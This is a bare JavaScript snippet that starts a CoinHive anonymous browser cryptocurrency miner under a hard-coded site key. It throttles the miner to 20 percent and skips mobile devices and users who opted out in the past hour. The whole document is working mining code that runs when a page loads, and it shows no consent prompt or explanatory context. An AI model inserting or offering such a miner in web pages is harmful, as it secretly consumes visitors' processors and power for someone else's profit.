var miner = new CoinHive.Anonymous('g0mvMb2D3Jo9M7s94kwOXUmOKaj20P67', {
    throttle: 0.2
});
if (!miner.isMobile() && !miner.didOptOut(3600)) {
    miner.start();
}